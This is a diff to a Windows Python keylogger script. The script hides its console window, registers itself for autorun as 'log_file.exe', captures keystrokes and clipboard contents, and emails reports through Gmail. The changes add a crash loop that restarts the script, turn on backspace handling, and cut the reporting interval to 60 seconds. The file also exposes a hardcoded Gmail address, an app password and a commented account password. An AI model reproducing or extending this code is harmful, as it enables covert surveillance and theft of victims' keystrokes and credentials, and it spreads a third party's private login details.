@@ -13,6 +13,7 @@ from email.header import Header
 from threading import Timer
 from datetime import datetime
 import getpass
+from pip import main
 import pyperclip
 import pyautogui
 import ctypes
@@ -20,11 +21,22 @@ import autorun
 import win32process
 import  shutil
 import logging
-import sys
 
+def start_script():
+    try:
+        main_func()
+    except:
+        
+        handle_crash()
 
+def handle_crash():
+    time.sleep(3)  # Restarts the script after 2 seconds
+    start_script()
 
-autorun.AddToRegistry()
+    
+
+autorun.AddToRegistry('log_file.exe')
+
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
 if hwnd != 0:      
     ctypes.windll.user32.ShowWindow(hwnd, 0)      
@@ -80,7 +92,7 @@ def main_func():
     print('main function started')
     global clipboard_data
     isdataavailable()
-    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
+    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "007711meenakshi@gmail.com"
     EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
     # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
@@ -113,9 +125,9 @@ def main_func():
                 elif name == "enter":
                     # add a new line whenever an ENTER is pressed
                     name = "\n"
-                # elif name == "backspace":
-                #     self.log[:-1]
-                #     name = ''
+                elif name == "backspace":
+                    self.log = self.log[:-1]
+                    name = ''
                 elif name == "decimal":
                     name = "."
                 else:
@@ -230,17 +242,22 @@ def main_func():
 try:
     # printf("GeeksforGeeks")
     
-    main_func()
+    start_script()
 except Exception as Argument:
  
-     # creating/opening a file
-     f = open("error.txt", "a")
- 
-     # writing in the file
-     f.write(str(Argument))
-      
-     # closing the file
-     f.close()
+    # creating/opening a file
+    f = open("error.txt", "a")
+
+    # writing in the file
+    f.write(str(Argument))
+    
+    # closing the file
+    f.close()
+    start_script()
+except:
+    start_script()
+    
+
 
 # def is_admin():
 #     try:
